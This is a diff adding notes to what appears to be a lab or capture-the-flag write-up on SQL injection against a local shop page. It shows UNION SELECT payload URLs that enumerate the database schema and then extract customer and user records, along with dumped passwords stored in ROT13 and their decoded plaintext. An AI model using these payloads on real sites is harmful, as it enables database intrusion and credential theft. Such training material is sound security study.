@@ -133,3 +133,51 @@ pretty sure i clicked on HAM
 injected a golden statement
 
 http://127.0.0.1:21632/pick.php?product=7%20UNION%20SELECT%20Table_schema,Column_name,table_name%20FROM%20Information_schema.columns
+
+siteusers 	customer 	        $id
+siteusers 	customer         	$name
+siteusers 	customer         	$account
+siteusers 	customer 	        $category
+siteusers 	customer         	$description
+siteusers 	net_products 	    $id
+siteusers 	net_products 	    $quantity
+siteusers 	net_products      $product
+siteusers 	net_products     	$price
+siteusers 	purchase_history 	$id
+siteusers 	purchase_history 	$quantity
+siteusers 	purchase_history 	$product
+siteusers 	purchase_history 	$account
+siteusers 	shippingdates   	$id
+siteusers 	shippingdates 	  $ordernumber
+siteusers 	shippingdates 	  $account
+siteusers 	shippingdates 	  $date
+siteusers 	users         	  $user_id
+siteusers 	users         	  $name
+siteusers 	users 	          $username
+
+Craft custom queries
+
+http://127.0.0.1:21632/pick.php?product=7%20UNION%20SELECT%20name,id,account%20FROM%20siteusers.customer
+
+http://127.0.0.1:21632/pick.php?product=7%20UNION%20SELECT%20user_id,name,username%20FROM%20siteusers.users
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	nccyrObggbzW3na$ 	        $Aaron
+2 	GhexrlQnl24 	            $user2
+3 	Obo4GURCva3nccyrf 	      $user3
+4 	Lroth 	                  $Lee_Roth
+4 	nabgurecnffjbeq4GURntrf 	$Lroth
+
+decrypted from ROT13 in cyberchef
+
+1   appleBottomJ3an$          $Aaron
+2   TurkeyDay24               $user2 
+3   Bob4THEPin3apples         $user3 
+4   Yebgu                     $Lee_Roth 
+5   anotherpassword4THEages   $Lroth
+
+
+ 
+                                                         column,column,column FROM Database.Table
+            <URL>/Uniondemo.php?selection=2 UNION SELECT name,id,account FROM siteusers.customer
